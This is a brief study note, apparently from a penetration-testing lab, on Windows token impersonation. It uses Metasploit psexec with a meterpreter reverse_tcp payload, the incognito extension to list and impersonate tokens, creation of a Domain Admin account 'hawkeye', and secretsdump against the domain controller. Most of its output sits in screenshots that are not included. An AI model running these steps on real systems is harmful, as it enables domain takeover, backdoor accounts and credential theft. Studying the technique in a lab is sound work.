Token Impersonation Walkthrough

Wednesday, October 11, 2023

10:27 PM

 

> Delegate token is created when user logs in
>
>  
>
>  

-   Get Metasploit running with psexec. Use option 4 in this case.

> ![](009_Token_Impersonation_Walkthrough_000.png){width="12.354166666666666in" height="6.125in"}
>
>  
>
>  

-   Set payload to x64 reverse shell

    -   set payload windows/x64/meterpreter/reverse_tcp

>  
>
>  

-   Set all options

> ![](009_Token_Impersonation_Walkthrough_001.png){width="7.96875in" height="2.2916666666666665in"}
>
>  
>
>  
>
>  

-   Run

> ![](009_Token_Impersonation_Walkthrough_002.png){width="8.479166666666666in" height="2.6979166666666665in"}
>
> \*USER YOU ARE IMPERSONATION MUST HAVE LOGGED IN THAT SESSION FOR A TOKEN TO BE AVAILABLE\*
>
>  

-   Load incognito

> ![](009_Token_Impersonation_Walkthrough_003.png){width="4.145833333333333in" height="0.40625in"}
>
>  

-   Other extensions you can load (load and hit tab twice)

> ![](009_Token_Impersonation_Walkthrough_004.png){width="12.729166666666666in" height="2.6875in"}
>
>  
>
> ![](009_Token_Impersonation_Walkthrough_005.png){width="6.552083333333333in" height="2.5416666666666665in"}
>
>  

-   List_tokens -u

> ![](009_Token_Impersonation_Walkthrough_006.png){width="3.8229166666666665in" height="2.6666666666666665in"}
>
>  

-   Impersonate_token

> ![](009_Token_Impersonation_Walkthrough_007.png){width="5.15625in" height="0.9479166666666666in"}
>
>  

-   Enter a shell and confirm

> ![](009_Token_Impersonation_Walkthrough_008.png){width="4.59375in" height="1.96875in"}
>
>  

-   Rev2self command to exit impersonate token

> ![](009_Token_Impersonation_Walkthrough_009.png){width="3.0416666666666665in" height="0.96875in"}
>
>  

-   One more time as Domain Admin

> ![](009_Token_Impersonation_Walkthrough_010.png){width="6.1875in" height="5.90625in"}
>
>  

-   Adding a user to domain for proof of concept -hawkeye Password1@

> ![](009_Token_Impersonation_Walkthrough_011.png){width="7.125in" height="2.1041666666666665in"}
>
>  

-   Add hawkeye to Domain Admins group

> ![](009_Token_Impersonation_Walkthrough_012.png){width="6.9375in" height="1.5625in"}
>
>  
>
>  

-   Secretsdump the domain controller with new creds as proof of concept

> ![](009_Token_Impersonation_Walkthrough_013.png){width="12.21875in" height="9.572916666666666in"}

ev
